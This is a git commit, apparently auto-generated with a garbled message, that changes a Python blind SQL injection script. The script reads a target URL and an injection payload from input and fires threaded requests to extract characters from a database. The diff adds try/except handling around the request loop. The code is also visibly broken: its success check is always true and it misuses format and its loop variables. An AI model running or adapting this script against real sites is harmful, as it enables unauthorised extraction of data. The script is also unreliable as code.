64e8eb2ca959f59a7dbc7d36453a425de0280607
whb54012 <1226844928@qq.com>
2026-07-27 10:31:19 +0000

    自动提交：更新 ${2026/7/27 18:31ilenPM31e}

--- python/盲注脚本.py
+++ python/盲注脚本.py
@@ -10,10 +10,13 @@ url = input("输入url及注入点")
 data=input("输入注入语句")
 def fun(url,result,result2):
     for i in result2:
-        reponse=requests.get(url+data.format(result,result2))
-        if '' in reponse.text:
-            print(result,url+format(result,result2),chr(result2))
-            break
+        try:
+            reponse=requests.get(url+data.format(result,result2))
+            if '' in reponse.text:
+                print(result,url+format(result,result2),chr(result2))
+                break
+        except:continue
+    return
 for  i in range(1,150):
     t=threading.Thread(target=fun,args=(url,i,result))
     t.start()
